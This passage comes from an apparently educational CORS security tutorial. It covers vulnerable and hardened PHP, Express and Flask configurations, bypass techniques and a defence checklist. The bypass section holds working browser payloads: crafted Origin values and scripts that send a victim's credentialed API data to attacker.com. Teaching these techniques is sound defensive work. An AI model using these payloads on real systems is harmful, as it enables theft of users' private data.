              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Reflects any origin blindly</span>
<span class="code-keyword">$origin</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_ORIGIN'</span>] ?? <span class="code-string">'*'</span>;

<span class="code-comment">// DANGEROUS: No validation - reflects attacker-controlled origin</span>
<span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Origin: "</span> . <span class="code-keyword">$origin</span>);
<span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Credentials: true"</span>);
<span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS"</span>);
<span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Headers: *"</span>);

<span class="code-comment">// Attacker can now:</span>
<span class="code-comment">-- 1. Host evil.com with JavaScript</span>
<span class="code-comment">-- 2. Make credentialed requests to this API</span>
<span class="code-comment">-- 3. Read sensitive responses</span>

<span class="code-keyword">echo</span> <span class="code-function">json_encode</span>([
    <span class="code-string">'user_id'</span> => <span class="code-keyword">$_SESSION</span>[<span class="code-string">'user_id'</span>],
    <span class="code-string">'email'</span> => <span class="code-keyword">$user</span>[<span class="code-string">'email'</span>],
    <span class="code-string">'ssn'</span> => <span class="code-keyword">$user</span>[<span class="code-string">'ssn'</span>],
    <span class="code-string">'balance'</span> => <span class="code-keyword">$account</span>[<span class="code-string">'balance'</span>]
]);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">CORSPolicy</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$allowedOrigins</span> = [
        <span class="code-string">'https://app.example.com'</span>,
        <span class="code-string">'https://admin.example.com'</span>,
        <span class="code-string">'https://partner.example.com'</span>
    ];
    
    <span class="code-keyword">private</span> <span class="code-keyword">$allowedMethods</span> = [<span class="code-string">'GET'</span>, <span class="code-string">'POST'</span>];
    <span class="code-keyword">private</span> <span class="code-keyword">$allowedHeaders</span> = [<span class="code-string">'Content-Type'</span>, <span class="code-string">'Authorization'</span>];
    <span class="code-keyword">private</span> <span class="code-keyword">$exposeHeaders</span> = [<span class="code-string">'X-Request-Id'</span>];
    <span class="code-keyword">private</span> <span class="code-keyword">$maxAge</span> = <span class="code-keyword">3600</span>;
    <span class="code-keyword">private</span> <span class="code-keyword">$allowCredentials</span> = <span class="code-keyword">true</span>;
    
    <span class="code-keyword">public function</span> <span class="code-function">handleRequest</span>() {
        <span class="code-keyword">$origin</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_ORIGIN'</span>] ?? <span class="code-keyword">null</span>;
        
        <span class="code-comment">// Reject if no origin (same-origin request or direct API call)</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">$origin</span> === <span class="code-keyword">null</span>) {
            <span class="code-keyword">return</span>;
        }
        
        <span class="code-comment">// STRICT validation: Exact match only</span>
        <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$origin</span>, <span class="code-keyword">$this</span>-><span class="code-attr">allowedOrigins</span>, <span class="code-keyword">true</span>)) {
            <span class="code-comment">// Log suspicious attempt</span>
            <span class="code-function">error_log</span>(<span class="code-string">"CORS violation from: "</span> . <span class="code-keyword">$origin</span>);
            <span class="code-keyword">return</span>;
        }
        
        <span class="code-comment">// Set validated origin (never reflect user input)</span>
        <span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Origin: "</span> . <span class="code-keyword">$origin</span>);
        
        <span class="code-comment">// Only allow credentials with validated origins (never with *)</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">$this</span>-><span class="code-attr">allowCredentials</span>) {
            <span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Credentials: true"</span>);
        }
        
        <span class="code-comment">// Handle preflight</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_METHOD'</span>] === <span class="code-string">'OPTIONS'</span>) {
            <span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Methods: "</span> . <span class="code-function">implode</span>(<span class="code-string">', '</span>, <span class="code-keyword">$this</span>-><span class="code-attr">allowedMethods</span>));
            <span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Headers: "</span> . <span class="code-function">implode</span>(<span class="code-string">', '</span>, <span class="code-keyword">$this</span>-><span class="code-attr">allowedHeaders</span>));
            <span class="code-function">header</span>(<span class="code-string">"Access-Control-Max-Age: "</span> . <span class="code-keyword">$this</span>-><span class="code-attr">maxAge</span>);
            <span class="code-function">http_response_code</span>(<span class="code-keyword">204</span>);
            <span class="code-keyword">exit</span>;
        }
        
        <span class="code-comment">// Expose only necessary headers</span>
        <span class="code-keyword">if</span> (!<span class="code-function">empty</span>(<span class="code-keyword">$this</span>-><span class="code-attr">exposeHeaders</span>)) {
            <span class="code-function">header</span>(<span class="code-string">"Access-Control-Expose-Headers: "</span> . <span class="code-function">implode</span>(<span class="code-string">', '</span>, <span class="code-keyword">$this</span>-><span class="code-attr">exposeHeaders</span>));
        }
    }
}

<span class="code-comment">// Usage</span>
<span class="code-keyword">$cors</span> = <span class="code-keyword">new</span> <span class="code-function">CORSPolicy</span>();
<span class="code-keyword">$cors</span>-><span class="code-function">handleRequest</span>();

<span class="code-comment">// Continue with API logic...</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure Node.js/Express CORS</h3>
        <p class="text-content">
          <strong>Scenario:</strong> Express.js API with proper CORS middleware configuration.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Express CORS</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> cors = <span class="code-function">require</span>(<span class="code-string">'cors'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-comment">// DANGEROUS: Allows any origin with credentials</span>
app.<span class="code-function">use</span>(<span class="code-function">cors</span>({
    <span class="code-attr">origin</span>: <span class="code-keyword">true</span>,           <span class="code-comment">-- Reflects any origin!</span>
    <span class="code-attr">credentials</span>: <span class="code-keyword">true</span>,      <span class="code-comment">-- Allows cookies!</span>
    <span class="code-attr">methods</span>: <span class="code-string">'*'</span>,           <span class="code-comment">-- Any HTTP method!</span>
    <span class="code-attr">allowedHeaders</span>: <span class="code-string">'*'</span>     <span class="code-comment">-- Any header!</span>
}));

<span class="code-comment">// Even worse: wildcard with credentials (browser blocks but bad practice)</span>
app.<span class="code-function">use</span>(<span class="code-function">cors</span>({
    <span class="code-attr">origin</span>: <span class="code-string">'*'</span>,
    <span class="code-attr">credentials</span>: <span class="code-keyword">true</span>
}));</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Express CORS</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-comment">// Define strict allowlist</span>
<span class="code-keyword">const</span> ALLOWED_ORIGINS = [
    <span class="code-string">'https://app.example.com'</span>,
    <span class="code-string">'https://admin.example.com'</span>
];

<span class="code-comment">// Custom CORS middleware with strict validation</span>
<span class="code-keyword">const</span> <span class="code-function">corsMiddleware</span> = (<span class="code-attr">req</span>, <span class="code-attr">res</span>, <span class="code-attr">next</span>) => {
    <span class="code-keyword">const</span> origin = req.headers.origin;
    
    <span class="code-comment">// Reject if origin not in allowlist</span>
    <span class="code-keyword">if</span> (!ALLOWED_ORIGINS.<span class="code-function">includes</span>(origin)) {
        <span class="code-comment">// Don't set CORS headers - browser will enforce SOP</span>
        <span class="code-keyword">return</span> <span class="code-function">next</span>();
    }
    
    <span class="code-comment">// Set specific origin (never *)</span>
    res.<span class="code-function">setHeader</span>(<span class="code-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="code-function">setHeader</span>(<span class="code-string">'Vary'</span>, <span class="code-string">'Origin'</span>);  <span class="code-comment">-- Important for caching!</span>
    
    <span class="code-comment">// Credentials only with validated origins</span>
    res.<span class="code-function">setHeader</span>(<span class="code-string">'Access-Control-Allow-Credentials'</span>, <span class="code-string">'true'</span>);
    
    <span class="code-comment">// Preflight handling</span>
    <span class="code-keyword">if</span> (req.method === <span class="code-string">'OPTIONS'</span>) {
        res.<span class="code-function">setHeader</span>(<span class="code-string">'Access-Control-Allow-Methods'</span>, <span class="code-string">'GET, POST'</span>);
        res.<span class="code-function">setHeader</span>(<span class="code-string">'Access-Control-Allow-Headers'</span>, <span class="code-string">'Content-Type, Authorization'</span>);
        res.<span class="code-function">setHeader</span>(<span class="code-string">'Access-Control-Max-Age'</span>, <span class="code-string">'3600'</span>);
        <span class="code-keyword">return</span> res.<span class="code-function">sendStatus</span>(<span class="code-keyword">204</span>);
    }
    
    <span class="code-function">next</span>();
};

app.<span class="code-function">use</span>(corsMiddleware);

<span class="code-comment">// Additional: CSRF token validation for state-changing operations</span>
<span class="code-keyword">const</span> <span class="code-function">csrfProtection</span> = (<span class="code-attr">req</span>, <span class="code-attr">res</span>, <span class="code-attr">next</span>) => {
    <span class="code-keyword">const</span> token = req.headers[<span class="code-string">'x-csrf-token'</span>];
    <span class="code-keyword">if</span> (req.method !== <span class="code-string">'GET'</span> && !<span class="code-function">validateToken</span>(token)) {
        <span class="code-keyword">return</span> res.<span class="code-function">sendStatus</span>(<span class="code-keyword">403</span>);
    }
    <span class="code-function">next</span>();
};

app.<span class="code-function">use</span>(<span class="code-string">'/api/'</span>, csrfProtection);</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python Flask Secure CORS</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Python Flask Secure Implementation</span></div>
          <pre><code><span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, jsonify
<span class="code-keyword">from</span> functools <span class="code-keyword">import</span> wraps
<span class="code-keyword">import</span> re

<span class="code-attr">app</span> = Flask(__name__)

<span class="code-comment"># Strict origin allowlist</span>
<span class="code-attr">ALLOWED_ORIGINS</span> = {
    <span class="code-string">'https://app.example.com'</span>,
    <span class="code-string">'https://admin.example.com'</span>
}

<span class="code-comment"># Optional: Regex for dynamic subdomains (use with caution)</span>
<span class="code-attr">ORIGIN_PATTERN</span> = re.<span class="code-function">compile</span>(<span class="code-string">r'^https://[a-z0-9-]+\.example\.com$'</span>)

<span class="code-keyword">def</span> <span class="code-function">validate_origin</span>(origin):
    <span class="code-keyword">if</span> <span class="code-keyword">not</span> origin:
        <span class="code-keyword">return</span> <span class="code-keyword">False</span>
    
    <span class="code-comment"># Exact match preferred</span>
    <span class="code-keyword">if</span> origin <span class="code-keyword">in</span> ALLOWED_ORIGINS:
        <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    
    <span class="code-comment"># Or strict regex validation</span>
    <span class="code-keyword">if</span> ORIGIN_PATTERN.<span class="code-function">match</span>(origin):
        <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    
    <span class="code-keyword">return</span> <span class="code-keyword">False</span>

<span class="code-keyword">def</span> <span class="code-function">cors_decorator</span>(<span class="code-attr">allow_credentials</span>=<span class="code-keyword">True</span>, <span class="code-attr">allow_methods</span>=[<span class="code-string">'GET'</span>]):
    <span class="code-keyword">def</span> <span class="code-function">decorator</span>(<span class="code-attr">f</span>):
        <span class="code-attr">@wraps</span>(f)
        <span class="code-keyword">def</span> <span class="code-function">decorated_function</span>(*args, **kwargs):
            origin = request.headers.<span class="code-function">get</span>(<span class="code-string">'Origin'</span>)
            
            <span class="code-comment"># Validate origin strictly</span>
            <span class="code-keyword">if</span> <span class="code-keyword">not</span> <span class="code-function">validate_origin</span>(origin):
                <span class="code-comment"># Return response without CORS headers</span>
                <span class="code-keyword">return</span> <span class="code-function">f</span>(*args, **kwargs)
            
            <span class="code-comment"># Handle preflight</span>
            <span class="code-keyword">if</span> request.method == <span class="code-string">'OPTIONS'</span>:
                response = jsonify({<span class="code-string">'status'</span>: <span class="code-string">'ok'</span>})
                response.status_code = <span class="code-keyword">204</span>
            <span class="code-keyword">else</span>:
                response = <span class="code-function">f</span>(*args, **kwargs)
            
            <span class="code-comment"># Set CORS headers only for validated origins</span>
            response.headers[<span class="code-string">'Access-Control-Allow-Origin'</span>] = origin
            response.headers[<span class="code-string">'Vary'</span>] = <span class="code-string">'Origin'</span>
            
            <span class="code-keyword">if</span> allow_credentials:
                response.headers[<span class="code-string">'Access-Control-Allow-Credentials'</span>] = <span class="code-string">'true'</span>
            
            <span class="code-keyword">if</span> request.method == <span class="code-string">'OPTIONS'</span>:
                response.headers[<span class="code-string">'Access-Control-Allow-Methods'</span>] = <span class="code-string">', '</span>.<span class="code-function">join</span>(allow_methods)
                response.headers[<span class="code-string">'Access-Control-Allow-Headers'</span>] = <span class="code-string">'Content-Type, Authorization'</span>
                response.headers[<span class="code-string">'Access-Control-Max-Age'</span>] = <span class="code-string">'3600'</span>
            
            <span class="code-keyword">return</span> response
        <span class="code-keyword">return</span> decorated_function
    <span class="code-keyword">return</span> decorator

<span class="code-attr">@app.route</span>(<span class="code-string">'/api/user'</span>)
<span class="code-attr">@cors_decorator</span>(<span class="code-attr">allow_credentials</span>=<span class="code-keyword">True</span>, <span class="code-attr">allow_methods</span>=[<span class="code-string">'GET'</span>])
<span class="code-keyword">def</span> <span class="code-function">get_user</span>():
    <span class="code-keyword">return</span> jsonify({<span class="code-string">'user'</span>: <span class="code-string">'data'</span>})</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> CORS Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ various techniques to bypass CORS validation logic and exploit misconfigurations.
        </p>

        <h3 class="subsection-title">1. Subdomain Takeover / Enumeration</h3>
        <p class="text-content">
          Exploit overly broad subdomain patterns by finding or creating valid subdomains that bypass validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Subdomain Bypass Techniques</span></div>
          <pre><code><span class="code-comment">-- Vulnerable regex: /^https:\/\/.*\.example\.com$/</span>
<span class="code-string">Origin: https://evil.com?example.com</span>     <span class="code-comment">-- Bypass via query string</span>
<span class="code-string">Origin: https://evil.com#.example.com</span>    <span class="code-comment">-- Bypass via fragment</span>
<span class="code-string">Origin: https://evil.com/.example.com</span>    <span class="code-comment">-- Bypass via path</span>

<span class="code-comment">-- Vulnerable regex: /^https:\/\/[a-z]+\.example\.com$/</span>
<span class="code-string">Origin: https://evil.example.com.attacker.com</span>  <span class="code-comment">-- Double subdomain</span>

<span class="code-comment">-- Exploit abandoned subdomains</span>
<span class="code-comment">-- 1. Enumerate subdomains: dev.example.com, staging.example.com</span>
<span class="code-comment">-- 2. Check if abandoned (DNS points to expired cloud resource)</span>
<span class="code-comment">-- 3. Claim the resource (S3 bucket, Heroku app, etc.)</span>
<span class="code-string">Origin: https://staging.example.com</span>  <span class="code-comment">-- Now attacker-controlled!</span>

<span class="code-comment">-- XSS on any trusted subdomain</span>
<span class="code-comment">-- If *.example.com is trusted, XSS on blog.example.com = game over</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Null Origin Abuse</h3>
        <p class="text-content">
          Many applications whitelist null origin for local development or file-based workflows, creating an
          exploitation vector.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Null Origin Exploitation</span></div>
          <pre><code><span class="code-comment">-- Server allows null origin:</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">null</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>

<span class="code-comment">-- Exploit via sandboxed iframe</span>
<span class="code-tag">&lt;iframe</span> <span class="code-attr">sandbox</span>=<span class="code-string">"allow-scripts allow-forms"</span> <span class="code-attr">srcdoc</span>=<span class="code-string">"&lt;script&gt;...&lt;/script&gt;"</span><span class="code-tag">&gt;&lt;/iframe&gt;</span>

<span class="code-comment">-- Exploit via data:// URI</span>
<span class="code-tag">&lt;script&gt;</span>
<span class="code-keyword">window</span>.<span class="code-attr">location</span> = <span class="code-string">'data:text/html,&lt;script&gt;fetch("https://api.example.com/user",{credentials:"include"}).then(r=&gt;r.json()).then(d=&gt;fetch("https://attacker.com/steal?"+btoa(JSON.stringify(d))))&lt;/script&gt;'</span>;
<span class="code-tag">&lt;/script&gt;</span>

<span class="code-comment">-- Exploit via local file</span>
<span class="code-comment">-- Victim opens attacker.html from local filesystem (file:// protocol)</span>
<span class="code-comment">-- file:// sends null origin</span></code></pre>
        </div>

        <h3 class="subsection-title">3. DNS Rebinding</h3>
        <p class="text-content">
          Combine DNS rebinding with CORS to bypass origin validation that occurs at different times.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">DNS Rebinding Attack</span></div>
          <pre><code><span class="code-comment">-- Step 1: Attacker controls attacker.com with low TTL</span>
<span class="code-comment">-- Initial DNS query returns attacker IP</span>

<span class="code-comment">-- Step 2: Victim visits attacker.com</span>
<span class="code-comment">-- Browser caches DNS resolution</span>

<span class="code-comment">-- Step 3: Attacker changes DNS to target IP (api.example.com)</span>
<span class="code-comment">-- TTL expires, browser re-resolves</span>

<span class="code-comment">-- Step 4: JavaScript makes request to attacker.com</span>
<span class="code-comment">-- Browser sends Origin: https://attacker.com</span>
<span class="code-comment">-- But request goes to api.example.com!</span>

<span class="code-tag">&lt;script&gt;</span>
<span class="code-keyword">fetch</span>(<span class="code-string">'https://attacker.com/api/user'</span>, {<span class="code-attr">credentials</span>: <span class="code-string">'include'</span>})
.<span class="code-function">then</span>(<span class="code-attr">r</span> => r.<span class="code-function">json</span>())
.<span class="code-function">then</span>(<span class="code-attr">data</span> => <span class="code-function">console</span>.<span class="code-function">log</span>(data));
<span class="code-tag">&lt;/script&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">4. XSS to CORS Escalation</h3>
        <p class="text-content">
          Use XSS on a trusted origin to bypass CORS restrictions entirely.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">XSS + CORS Chaining</span></div>
          <pre><code><span class="code-comment">-- If blog.example.com is trusted and has XSS:</span>
<span class="code-comment">-- Inject payload that makes same-origin requests to api.example.com</span>

<span class="code-tag">&lt;script&gt;</span>
<span class="code-comment">// From blog.example.com XSS context</span>
<span class="code-comment">// Same-origin to api.example.com (if same domain or subdomain trust)</span>

<span class="code-keyword">fetch</span>(<span class="code-string">'https://api.example.com/admin/users'</span>, {
    <span class="code-attr">credentials</span>: <span class="code-string">'include'</span>
})
.<span class="code-function">then</span>(<span class="code-attr">r</span> => r.<span class="code-function">json</span>())
.<span class="code-function">then</span>(<span class="code-attr">users</span> => {
    <span class="code-comment">// Exfiltrate via image request (no CORS needed)</span>
    <span class="code-keyword">new</span> <span class="code-function">Image</span>().<span class="code-attr">src</span> = <span class="code-string">'https://attacker.com/steal?d='</span> + <span class="code-function">btoa</span>(<span class="code-function">JSON.stringify</span>(users));
});
<span class="code-tag">&lt;/script&gt;</span>

<span class="code-comment">-- Or use XHR withCredentials in XSS context</span>
<span class="code-keyword">var</span> xhr = <span class="code-keyword">new</span> <span class="code-function">XMLHttpRequest</span>();
xhr.<span class="code-function">open</span>(<span class="code-string">'GET'</span>, <span class="code-string">'https://api.example.com/secrets'</span>, <span class="code-keyword">true</span>);
xhr.<span class="code-attr">withCredentials</span> = <span class="code-keyword">true</span>;
xhr.<span class="code-attr">onload</span> = <span class="code-keyword">function</span>() {
    <span class="code-function">fetch</span>(<span class="code-string">'https://attacker.com/steal?data='</span> + <span class="code-function">btoa</span>(xhr.<span class="code-attr">responseText</span>));
};
xhr.<span class="code-function">send</span>();</code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> CORS Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never reflect arbitrary origins. Use strict allowlists, avoid credentials
          with broad CORS policies, implement additional authentication layers, and treat CORS as a defense-in-depth
          mechanism—not a primary security control. Always combine with CSRF tokens and proper session management.
        </div>

        <h3 class="subsection-title">Layer 1: Strict Origin Validation</h3>
        <p class="text-content">
          Implement exact-match origin validation with no wildcard allowances when credentials are used.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Origin Validation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// NEVER use these patterns:</span>
<span class="code-comment">// header("Access-Control-Allow-Origin: *");</span>
<span class="code-comment">// header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);</span>
<span class="code-comment">// header("Access-Control-Allow-Origin: null");</span>

<span class="code-comment">// ALWAYS use strict allowlist:</span>
<span class="code-keyword">$allowed_origins</span> = [
    <span class="code-string">'https://app.example.com'</span>,
    <span class="code-string">'https://admin.example.com'</span>
];

<span class="code-keyword">$origin</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_ORIGIN'</span>] ?? <span class="code-keyword">null</span>;

<span class="code-keyword">if</span> (<span class="code-keyword">$origin</span> && <span class="code-function">in_array</span>(<span class="code-keyword">$origin</span>, <span class="code-keyword">$allowed_origins</span>, <span class="code-keyword">true</span>)) {
    <span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Origin: "</span> . <span class="code-keyword">$origin</span>);
    <span class="code-function">header</span>(<span class="code-string">"Vary: Origin"</span>);  <span class="code-comment">-- Prevent cache poisoning!</span>
} <span class="code-keyword">else</span> {
    <span class="code-comment">// No CORS headers = browser enforces SOP</span>
    <span class="code-function">http_response_code</span>(<span class="code-keyword">403</span>);
    <span class="code-keyword">exit</span>;
}

<span class="code-comment">// If using regex (avoid if possible), be extremely strict:</span>
<span class="code-keyword">$pattern</span> = <span class="code-string">'/^https:\/\/[a-z0-9-]+\.example\.com$/'</span>;
<span class="code-keyword">if</span> (!<span class="code-function">preg_match</span>(<span class="code-keyword">$pattern</span>, <span class="code-keyword">$origin</span>)) {
    <span class="code-keyword">exit</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Credential Controls</h3>
        <p class="text-content">
          Never combine wildcard origins with credentials. Be extremely cautious with credential allowances.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Credential Handling</span></div>
          <pre><code><span class="code-comment">-- Rule: If credentials are allowed, origin MUST be explicitly validated</span>

<span class="code-comment">-- Safe pattern:</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">https://app.example.com</span>   <span class="code-comment">-- Specific origin</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>                    <span class="code-comment">-- Credentials OK</span>

<span class="code-comment">-- DANGEROUS (browser should block, but don't rely on it):</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">*</span>                              <span class="code-comment">-- Wildcard</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>                    <span class="code-comment">-- Credentials</span>

<span class="code-comment">-- Alternative: Use token-based auth instead of cookies</span>
<span class="code-comment">-- No credentials needed = simpler CORS policy</span>
<span class="code-attr">Authorization</span>: <span class="code-string">Bearer eyJhbGciOiJIUzI1NiIs...</span>  <span class="code-comment">-- Header-based auth</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">*</span>                    <span class="code-comment">-- Safe without credentials</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Additional Security Headers</h3>
        <p class="text-content">
          Implement complementary security headers to reduce CORS attack surface.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Security Headers Configuration</span></div>
          <pre><code><span class="code-comment">-- Content Security Policy</span>
<span class="code-attr">Content-Security-Policy</span>: <span class="code-string">default-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none';</span>

<span class="code-comment">-- Prevent clickjacking</span>
<span class="code-attr">X-Frame-Options</span>: <span class="code-string">DENY</span>
<span class="code-attr">Content-Security-Policy</span>: <span class="code-string">frame-ancestors 'none';</span>

<span class="code-comment">-- Strict Transport Security</span>
<span class="code-attr">Strict-Transport-Security</span>: <span class="code-string">max-age=31536000; includeSubDomains; preload</span>

<span class="code-comment">-- Referrer Policy</span>
<span class="code-attr">Referrer-Policy</span>: <span class="code-string">strict-origin-when-cross-origin</span>

<span class="code-comment">-- Permissions Policy</span>
<span class="code-attr">Permissions-Policy</span>: <span class="code-string">geolocation=(), microphone=(), camera=()</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: CSRF Token Validation</h3>
        <p class="text-content">
          CORS does not replace CSRF protection. Implement additional token-based validation for state-changing
          operations.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">CSRF Defense Layer</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Double-submit cookie pattern</span>
<span class="code-keyword">class</span> <span class="code-function">CSRFProtection</span> {
    <span class="code-keyword">public static function</span> <span class="code-function">generateToken</span>() {
        <span class="code-keyword">if</span> (<span class="code-function">empty</span>(<span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>])) {
            <span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>] = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-keyword">32</span>));
        }
        <span class="code-keyword">return</span> <span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>];
    }
    
    <span class="code-keyword">public static function</span> <span class="code-function">validateToken</span>(<span class="code-keyword">$token</span>) {
        <span class="code-keyword">return</span> <span class="code-function">hash_equals</span>(<span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>] ?? <span class="code-string">''</span>, <span class="code-keyword">$token</span> ?? <span class="code-string">''</span>);
    }
}

<span class="code-comment">// API endpoint validation</span>
<span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_METHOD'</span>] !== <span class="code-string">'GET'</span>) {
    <span class="code-keyword">$headers</span> = <span class="code-function">getallheaders</span>();
    <span class="code-keyword">$csrf_token</span> = <span class="code-keyword">$headers</span>[<span class="code-string">'X-CSRF-Token'</span>] ?? <span class="code-keyword">$_POST</span>[<span class="code-string">'csrf_token'</span>] ?? <span class="code-string">''</span>;
    
    <span class="code-keyword">if</span> (!<span class="code-function">CSRFProtection::validateToken</span>(<span class="code-keyword">$csrf_token</span>)) {
        <span class="code-function">http_response_code</span>(<span class="code-keyword">403</span>);
        <span class="code-keyword">die</span>(<span class="code-string">'Invalid CSRF token'</span>);
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Monitoring and Alerting</h3>
        <p class="text-content">
          Implement comprehensive logging to detect and respond to CORS exploitation attempts.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">CORS Security Monitoring</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">function</span> <span class="code-function">logCORSAttempt</span>(<span class="code-keyword">$origin</span>, <span class="code-keyword">$allowed</span>) {
    <span class="code-keyword">$log</span> = [
        <span class="code-string">'timestamp'</span> => <span class="code-function">date</span>(<span class="code-string">'Y-m-d H:i:s'</span>),
        <span class="code-string">'origin'</span> => <span class="code-keyword">$origin</span>,
        <span class="code-string">'allowed'</span> => <span class="code-keyword">$allowed</span>,
        <span class="code-string">'ip'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'REMOTE_ADDR'</span>],
        <span class="code-string">'user_agent'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_USER_AGENT'</span>],
        <span class="code-string">'endpoint'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_URI'</span>],
        <span class="code-string">'referer'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_REFERER'</span>] ?? <span class="code-string">'none'</span>
    ];
    
    <span class="code-keyword">if</span> (!<span class="code-keyword">$allowed</span>) {
        <span class="code-function">error_log</span>(<span class="code-string">"[CORS VIOLATION] "</span> . <span class="code-function">json_encode</span>(<span class="code-keyword">$log</span>));
        
        <span class="code-comment">// Alert on repeated violations from same IP</span>
        <span class="code-keyword">$key</span> = <span class="code-string">'cors_violations_'</span> . <span class="code-keyword">$_SERVER</span>[<span class="code-string">'REMOTE_ADDR'</span>];
        <span class="code-keyword">$count</span> = <span class="code-keyword">$_SESSION</span>[<span class="code-keyword">$key</span>] = (<span class="code-keyword">$_SESSION</span>[<span class="code-keyword">$key</span>] ?? <span class="code-keyword">0</span>) + <span class="code-keyword">1</span>;
        
        <span class="code-keyword">if</span> (<span class="code-keyword">$count</span> > <span class="code-keyword">10</span>) {
            <span class="code-comment">// Trigger alert to security team</span>
            <span class="code-function">sendSecurityAlert</span>(<span class="code-string">'Potential CORS attack detected'</span>, <span class="code-keyword">$log</span>);
        }
    }
}
<span class="code-keyword">?&gt;</span>

<span class="code-comment">-- ModSecurity WAF Rules</span>
<span class="code-tag">SecRule</span> <span class="code-string">REQUEST_HEADERS:Origin</span> <span class="code-string">"!@rx ^https://(app|admin)\.example\.com$"</span> \
    <span class="code-string">"id:920001,phase:1,deny,status:403,msg:'Invalid CORS Origin'"</span>

<span class="code-tag">SecRule</span> <span class="code-string">REQUEST_METHOD</span> <span class="code-string">"^OPTIONS$"</span> \
